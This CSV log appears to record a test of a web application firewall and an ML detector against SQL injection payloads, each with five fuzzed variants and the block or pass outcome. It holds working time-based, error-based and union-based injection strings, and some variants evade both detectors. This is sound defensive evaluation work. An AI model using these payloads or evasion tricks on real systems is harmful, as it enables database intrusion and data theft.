Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T21:30:16.500851,1 or sleep  (  5  )  # tdgb,403,403,200,waf_correct_ml_incorrect," and 0x1 oR/**/sleep  (  '|[' not like '|[z'  )
 # tdgb[",2024-12-16T21:30:18.493859,403,200,waf_correct_ml_incorrect," anD 0x1 oR/**/sleep  (  '|[' not like '|[z'	/**/)
 # tdgb[v%",2024-12-16T21:30:22.196677,403,200,waf_correct_ml_incorrect," and 0x1 or/**/sleep  (  '|['/**/not like '|[z' /**/)
 # tdgb[v%",2024-12-16T21:30:26.161764,403,200,waf_correct_ml_incorrect, AND 0x1 Or/**/sleep  (  '|[' not like '|[z' /*_C287*/)  # tdgb[v%,2024-12-16T21:30:30.287394,403,200,waf_correct_ml_incorrect, ANd 0x1 Or sleep  (  '|[' not like '|[z' /**/)	 # tdgb[v%G,2024-12-16T21:30:34.436709,403,200,waf_correct_ml_incorrect
2,2024-12-16T21:30:38.347714,select sleep  (  5  )   and    (    (   8679  =  8679,403,403,200,waf_correct_ml_incorrect,"SElECT sleep  ( 
5266 LIKE  aND 1  )   AnD    (    (   8679   lIke  /**/(SelEcT 8679)",2024-12-16T21:30:40.941179,403,403,both_correct,"sElECT sleep  ( 
(SElecT (SELect 1)) Like  AND 1  )   AND	   (    (/**/  8679   lIKE  /**/(SeleCt 'kM'!='kMY')",2024-12-16T21:30:46.281512,403,403,both_correct,"SEleCt sleep  ( 
(SEleCt (SElEct (sELeCT 1))) LikE  AnD 1  )   aND	   (  
 (   (SELECT 4635<>4636)   liKE  /*B:~Q7*/(SeLect 'kM' NOT LIKE 'kMY')",2024-12-16T21:30:52.543085,403,403,both_correct,"SELECT sleep  ( 
(selECt (SeLeCt (sELEcT 1))) LIKe/**/ aND (SELECT 1)  ) 	 aND	   (  
 (   (sELECT 5772 NOT LIKE 5773<>0x121c)   LiKe  /*B:~Q7*/(SELEct 'kM' not like 'kMY')",2024-12-16T21:31:00.388027,403,403,both_correct,"SELECT sleep  ( 	(sELEcT (SeLeCt (sELeCT (SELECT  AND 1)))) LiKE/**/ anD (SElECt 'z'!='zw')  ) 	 aND	   (  
 (   (SeLEcT/**/5772 NOT LIKE 5773 not like 0x121c)   LikE  /**/(seLeCT 'kM' not like 'kMY')",2024-12-16T21:31:09.803376,403,403,both_correct
3,2024-12-16T21:31:20.335497,"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,403,403,200,waf_correct_ml_incorrect,"0x1%""  )   or exp  (  ~ 
(  select * from /**/ (  select concat  (  0x7171706a71,  (  select   (  elt  (   AND 1  =  6270,2783<>2784   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,2024-12-16T21:31:29.624727,403,403,both_correct,"0x1%""  )   or exp  (  ~ 	(  select * from /**/ (  select concat  (  0x7171706a71,  (  select/**/  (  elt  (   AND 'a;' LIKE 'a;'  =  0x187e,2783<>(SELECT 1)   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,2024-12-16T21:31:40.837853,403,403,both_correct,"0x1%""  )   or exp  (  ~ 	(  select * from   (  select concat  (  0x7171706a71,  (  select/*)P(*/  (  elt  (   AND 'a;' LIKE 'a;'  =  0x187e, AND '8|'!='8|j'<>(SELECT 0x1)   )    )     )  ,0x717a767a71,0x78   )    )   x   )    ) 
  and   (  ""%""  =  """,2024-12-16T21:31:52.762667,403,403,both_correct,"0x1%""  )   or exp  (  ~ 	(  select * from   (  select concat  (  0x7171706a71,  (  select/*)P(*/  (  elt  (   AND 'a;' LIKE 'a;'  =  0x187e,
AND ' OR 7929=7929|'!='(SELECT 8)|j'<>(SELECT 0x1)   )    )     )  ,0x717a767a71,0x78   )    )   x   )    ) 
  and   (/**/ ""%""  =  """,2024-12-16T21:32:05.931536,403,403,both_correct,"0x1%""  )   or exp  (  ~ 	(  select * from   (  select concat  (  0x7171706a71,  (  select/*)P(*/  (  elt  (   AND 'a;' LIKE 'a;'  =  0x187e,	AND ' OR 0x1ef9= AND 7487<>7488|'!='(SELECT 8)|j'<>(SELECT 0x1)   )    )     )  ,0x717a767a71,0x78   )    )   x   )    ) 
  and/**/  (/**/ ""%""  =  """,2024-12-16T21:32:19.762525,403,403,both_correct
4,2024-12-16T21:32:34.642359,arganza,200,200,200,both_correct,arganza,2024-12-16T21:32:35.111431,200,200,both_correct,arganza,2024-12-16T21:32:36.567516,200,200,both_correct,arganza,2024-12-16T21:32:38.030590,200,200,both_correct,arganza,2024-12-16T21:32:39.506170,200,200,both_correct,arganza,2024-12-16T21:32:40.969633,200,200,both_correct
5,2024-12-16T21:32:42.448801,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",403,403,403,both_correct,"sElEct count  ( /**/*  )   from generate_series  (  (SeleCT (SELECT 1)),'#Ir'<>'#Iru'  )   anD 'dfwj'	  like   'dfwj",2024-12-16T21:32:46.538835,403,200,waf_correct_ml_incorrect,"SeLEcT count  (  *  )	  FRoM generate_series  (  (selEcT (SElecT (sELecT (SELECT 3029<>3030)))),'#Ir'!='#Iru'  )   AND 'dfwj'	  liKE   'dfwj",2024-12-16T21:32:53.130328,403,403,both_correct,"SeLECT count  (  *  )   fROM generate_series  (  (SeLEcT (sELEct (SEleCT (SELeCT 0x230a=8970 not like  AND 1)))),'#Ir'!='#Iru'  )/**/  AND 'dfwj'	  LikE   'dfwj6",2024-12-16T21:33:01.142283,403,200,waf_correct_ml_incorrect,"SEleCT count  (  *  )   from generate_series  (  (SeLECT (SeLECt (SeleCT (SELeCt 0x230a= &&
0x1 not like  AnD '/='='/=')))),'#Ir'!='#Iru'  )   aNd 'dfwj'	  LIkE   'dfwj6#",2024-12-16T21:33:09.921798,403,200,waf_correct_ml_incorrect,"Select count  (  *  )/**/  FROM generate_series  (  (seLecT (seLeCT (SeLect (sEleCt 0x230a like  &&
0x1 not like  aNd '/='='/=')))),'#Ir'!='#Iru'  )   anD 'dfwj'   LIKe   'dfwj6#",2024-12-16T21:33:19.131535,403,200,waf_correct_ml_incorrect
6,2024-12-16T21:33:29.004918,"1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --",403,403,200,waf_correct_ml_incorrect,"'('!='(}''   )    ) 	  as hbdi WHERE 6758  =  6758 AnD elt  (   AnD (SELECT 1)   likE   1210,sleep  (  5   )    )/**/  --",2024-12-16T21:33:33.591758,200,403,waf_incorrect_ml_correct,"'('!='(}''   )    ) 
  as/**/hbdi WHErE 4613!=4614   like   6758 and elt  (   and (SelecT (SeLECt 1))   likE   1210,sleep  (  (seLEcT 5)   )    )/**/  --",2024-12-16T21:33:40.392689,200,200,both_incorrect,"'(' not like '(}''   )    )    as/**/hbdi WHErE  AND 1!=4614   like   6758 and elt  (   and (SelecT (SeLECt '=!'!='=!d'))   LIke   (SELECT 1210),sleep  (  (selEct 5)   )    )   --",2024-12-16T21:33:49.000702,403,403,both_correct,"'(' not like '(}''   )   
)    as hbdi WHErE  AND 1!=0x1206   like   6758 and elt  (   and (SelecT (SeLECt '=!'!='=!d'))   LIKe   (SELect  OR 0 not like 4019),sleep  (  (SElECT 5)   )    )   --",2024-12-16T21:33:58.491091,403,403,both_correct,"'(' not like '(}''   )   
)    as hbdi WHErE  AND 1!=0x1206   like   6758 and elt  ( /**/ and (SelecT (SeLECt '=!'!='=!d'))   LIKe   (SELect  OR 0 not like  OR 'Q' LIKE	'Q'),sleep  (  (SelEct (SELECT 5))   )    )   --",2024-12-16T21:34:08.674875,403,403,both_correct
7,2024-12-16T21:34:20.158839,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",403,403,200,waf_correct_ml_incorrect,"-6561""	  )    )     )   or (SELECT 0x1)  =  'P3'='P3'/**/and    (    (     (  ""azqp"" like ""azqp",2024-12-16T21:34:23.938588,403,200,waf_correct_ml_incorrect,"-0x19a1""   )    )/*mE']Z*/    )   or (SELECT 0x1)  =   OR '/p' LIKE '/p'/**/and    (    (     (  ""azqp"" like ""azqp",2024-12-16T21:34:29.456387,403,200,waf_correct_ml_incorrect,"-0x19a1""	  )    )/**/    )   or (SELECT 0x1)  =   OR '/p' LIKE '/p' and    (    (     (  ""azqp"" like ""azqp",2024-12-16T21:34:35.975204,403,403,both_correct,"-0x19a1""	  )    )     )   or (SELECT 0x1)  =   OR '/p' LIKE	'/p' and    (    (     (  ""azqp"" like ""azqp",2024-12-16T21:34:42.412207,403,403,both_correct,"-0x19a1""	  )    )/*\!R*/    )   or (SELECT 0x1)  =   OR '/p' LIKE
'/p' and    (    (     (  ""azqp"" like ""azqp",2024-12-16T21:34:48.307509,403,403,both_correct
8,2024-12-16T21:34:54.533347,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",403,403,403,both_correct,"-2254'  )   aS dyrv WHERe 9079/**/ = 
9079 union all sELEct 9079,9079,7960 like 7960,9079,(SeLEct 9079),9079,(sELEct 1),9079#p",2024-12-16T21:34:59.293499,403,403,both_correct,"-2254'  )   aS/**/dyrv Where 9079/**/  like   9079 union all SeLecT (SELECT 1),(SELECT 9079),7960 like 7960,9079,(SELECt 9079),'7' NOT LIKE '79',(sELeCT 1),9079#p?A",2024-12-16T21:35:06.558560,403,403,both_correct,"-(SELECT 2254)'  )   aS dyrv Where 84 NOT LIKE 85/**/  like
  9079 union all SeLecT (SELECT 1),(SELECT 9079),7960 like 7960,9079,(SELECt  AND 1),'7' NOT LIKE '79',(SeleCt 1),9079#p?Am",2024-12-16T21:35:15.332521,403,403,both_correct,"-(sEleCt  AnD 1)'  )  
aS dyrv Where 84 NOT LIKE 85/**/ /**/like
  9079 union all SeLecT (SELECT 1),(SELECT 9079),7960 like 7960,9079,(SELECt  AND 1),'8630 NOT LIKE 8631' NOT LIKE '79',(sElECt 1),0x2377#p?Am3",2024-12-16T21:35:25.171899,403,403,both_correct,"-(sElEct  ANd 1)'
 )  
aS dyrv Where 84 NOT LIKE 2439 IN (2438,2439,2440)  /**/like
  9079 union all SeLecT (SELECT 1),(SELECT  OR 0),7960 like 7960,(SELECT 9079),(SELECt  AND 1),'8630 not like 8631' NOT LIKE '79',(SELECT 1),0x2377#p?Am3I",2024-12-16T21:35:36.351475,403,403,both_correct
9,2024-12-16T21:35:48.691336,"1"" and make_set  (  8262  =  3471,3471  )   and ""wayp""  =  ""wayp",403,403,403,both_correct,"8807 IN (0x2266,8807,8808)"" and make_set /*T*/( 	(SELECT 1)  =  3471,3471  )   and ""wayp""  =  ""wayp",2024-12-16T21:35:51.863506,403,403,both_correct,"(SELECT 573 NOT LIKE 574) in (0x2266,8807,8808)"" and make_set /**/( 	(SELECT  OR 0) 
=  3471,3471  )   and/**/""wayp""  =  ""wayp",2024-12-16T21:35:57.890275,403,403,both_correct,"(SeleCt 573 not like  OR 0) In (0x2266,8807,8808)"" and make_set /**/( 	(SELECT  OR 3973 IN (3972,3973,3974))  =  3471,0xd8f  )  /**/and/**/""wayp""  =  ""wayp",2024-12-16T21:36:04.888087,403,403,both_correct,"(SElEcT 573 not like  or (SELECT 0)) in (0x2266, AND 1,8808)"" and make_set /**/( 
(SELECT  OR 3973/*K*/IN (3972,3973,'cmP'!='cmP~'))  =  3471,0xd8f  )  /**/and/**/""wayp""  =  ""wayp",2024-12-16T21:36:13.288842,403,403,both_correct,"(SELecT 573 not like  OR (SeLEct 0)) In (0x2266, aND 1,8808)"" and make_set /**/(  (SELECT  OR 3973/**/IN ((SELECT 1),(SELECT 3973),'cmP'!='cmP~'))  =  ';3'<>';3@',0xd8f  )  /**/and ""wayp""  =  ""wayp",2024-12-16T21:36:22.737809,403,403,both_correct
10,2024-12-16T21:36:33.565752,"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",403,403,200,waf_correct_ml_incorrect," Or 0 in (194,195,196) AnD 0xe7b   LIKE     (  seLEct count  ( /**/*  )   FRom sysibm.systables AS t1,sysibm.systables As t2,sysibm.systables as t3	 )  ",2024-12-16T21:36:39.396877,403,200,waf_correct_ml_incorrect," Or 0 iN ('f@!#'!='f@!#,', or 0,(sELeCT 196)) and 0xe7b   LikE     (  sElEct count  (  *  )   fRoM sysibm.systables As t1,sysibm.systables as t2,sysibm.systables AS t3
 )  ",2024-12-16T21:36:47.670582,403,200,waf_correct_ml_incorrect," or  ANd 1 In ('f@!#'<>'f@!#,', OR '|/E' NOT LIKE '|/EB',(sELect (SEleCt 196))) AnD 0xe7b   LiKe     (  seLect count  (  *  )   fROM/**/sysibm.systables As	t1,sysibm.systables aS t2,sysibm.systables as t3
 )  ",2024-12-16T21:36:56.995889,200,200,both_incorrect," OR  AnD (SeLect 1) in ('f@!#' NOT LIKE 'f@!#,', Or '|/E' NOT LIKE '|/EB',(Select (select 1721= AND 1))) aND 0xe7b   lIKE     (  SeLect count  (  *  )   FROm sysibm.systables AS	t1,sysibm.systables AS t2,sysibm.systables AS t3	 )  V",2024-12-16T21:37:07.961541,200,403,waf_incorrect_ml_correct," or  anD (SeLEct 0x1) iN ('f@!#' not like 'f@!#,', Or '|/E' NOT LIKE '|/EB',(sELEct (SELEcT  AND 1= And 6711 NOT LIKE 6712))) AnD 0xe7b   likE     (  SeLEcT/**/count  (  *  )   fROM sysibm.systables aS
t1,sysibm.systables AS t2,sysibm.systables aS t3	 )  Vm7",2024-12-16T21:37:20.102905,200,200,both_incorrect
